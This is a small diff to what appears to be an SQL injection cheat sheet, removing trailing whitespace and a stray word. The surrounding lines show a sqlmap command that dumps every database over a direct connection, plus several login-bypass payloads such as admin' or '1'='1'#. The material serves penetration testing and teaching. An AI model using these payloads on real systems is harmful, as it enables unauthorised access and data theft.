@@ -295,7 +295,7 @@ tamper=name_of_the_tamper
 You can use SQLmap to access a database via its port instead of a URL.
 
 ```ps1
-sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
+sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
 ```
 
 ## Authentication bypass
@@ -375,7 +375,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
-admin';-- azer 
+admin';--
 admin" #
 admin"/*
 admin" or "1"="1
